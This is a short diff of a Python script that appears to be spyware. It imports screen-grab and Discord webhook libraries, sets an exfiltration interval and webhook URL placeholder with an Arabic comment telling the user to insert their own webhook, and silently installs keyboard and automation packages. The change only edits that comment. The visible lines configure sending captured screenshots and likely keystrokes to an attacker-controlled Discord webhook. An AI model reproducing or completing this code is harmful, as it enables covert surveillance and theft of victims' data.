@@ -16,7 +16,7 @@ from PIL import ImageGrab
 from discord_webhook import DiscordWebhook
 
 # ==== CONFIG ====
-WEBHOOK_URL = "https://discord.com/api/webhooks/123456789/xxxxxxxxxxxxxxxxx"  # حط الويب هوك بتاعك هنا يا حيوان 😈
+WEBHOOK_URL = "https://discord.com/api/webhooks/123456789/xxxxxxxxxxxxxxxxx"  # حط الويب هوك بتاعك هنا 
 EXFIL_INTERVAL = 30  # ثواني
 # =================
 
@@ -148,3 +148,4 @@ if __name__ == "__main__":
         os.system("pip install pywin32 keyboard pyautogui pillow discord-webhook requests -q")
     
     main()
+
